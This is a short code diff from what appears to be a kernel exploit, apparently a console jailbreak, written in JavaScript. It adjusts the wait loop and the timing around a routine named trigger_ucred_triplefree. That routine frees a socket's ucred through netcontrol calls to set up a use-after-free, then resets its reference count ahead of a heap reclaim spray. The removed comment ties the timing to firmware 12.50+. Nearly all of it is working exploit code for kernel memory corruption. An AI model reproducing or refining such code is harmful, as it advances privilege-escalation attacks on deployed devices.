@@ -504,15 +504,8 @@ function nanosleep_fun (nsec: number) {
 }
 
 function wait_for (addr: BigInt, threshold: number) {
-  let waitCount = 0
   while (!read64(addr).eq(threshold)) {
-    if (waitCount % 100 === 0) {
-      // Periodically yield so worker threads get CPU time to signal completion
-      sched_yield()
-    } else {
-      nanosleep_fun(1000) // 1 microsecond — avoids busy-spin without blocking too long
-    }
-    waitCount++
+    nanosleep_fun(1)
   }
 }
 
@@ -1390,9 +1383,6 @@ function trigger_ucred_triplefree () {
     // Unregister dummy socket and free the file and ucred.
     write32(nc_clear_buf, uaf_socket)
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)
-
-    // Yield to let kernel allocator settle before reclaim spray — critical for 12.50+
-    for (let _s = 0; _s < 5; _s++) { sched_yield() }
 
     // Set cr_refcnt back to 1.
     for (let i = 0; i < 32; i++) {
